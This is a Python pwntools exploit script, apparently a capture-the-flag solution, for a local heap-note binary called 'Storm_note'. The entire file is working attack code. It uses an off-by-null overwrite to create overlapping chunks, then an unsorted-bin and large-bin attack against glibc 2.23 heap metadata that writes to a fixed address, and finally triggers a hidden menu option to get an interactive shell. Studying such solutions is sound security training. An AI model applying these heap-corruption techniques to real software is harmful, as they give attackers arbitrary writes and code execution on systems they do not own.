#!/usr/bin/env python
from pwn import *

p=process("./Storm_note")
#env={"LD_PRELOAD":"./libc-2.23.so"}

def create(size):
    p.recvuntil("Choice: ")
    p.sendline("1")
    p.recvuntil("size ?\n")
    p.sendline(str(size))

def edit(index,ctx):
    p.recvuntil("Choice: ")
    p.sendline("2")
    p.recvuntil("Index ?\n")
    p.sendline(str(index))
    p.recvuntil("Content: ")
    p.send(ctx)

def delete(index):
    p.recvuntil("Choice: ")
    p.sendline("3")
    p.recvuntil("Index ?\n")
    p.sendline(str(index))

gdb.attach(p)

create(0x108) #0
create(0x4e0) #1
create(0x100) #2
create(0x60) #3

edit(1,"a"*0x3f0+p64(0x400)+"\n")
delete(1)
edit(0,"a"*0x108)

create(0x100) #1
create(0x20) #4 
create(0x20) #5

delete(1)
delete(2)
create(0x5f0) #1
edit(1,"a"*0x100+p64(0)+p64(0x21)+"a"*0x10+p64(0)+p64(0x11)+p64(0)+p64(0x401)+"a"*0x3f0+p64(0)+p64(0xc1))
delete(5)
create(0x1000) #2

delete(4)
edit(1,"a"*0x100+p64(0)+p64(0x431)+p64(0xdeadbeef)+p64(0xabcd00f0-0x10)+p64(0x60)+p64(0x10)+p64(0)+p64(0x401)+p64(0xdeadbeef)+p64(0xabcd00e0-0x10+3)+p64(0xdeadbeef)+p64(0xabcd00e0-8)) #unsortedbin attack　and large bin attack, wonderfull
create(0x48) # 4
edit(4,"a"*0x48) 
p.recvuntil("Choice: ")
p.sendline("666")
p.send("a"*0x48)
p.interactive()

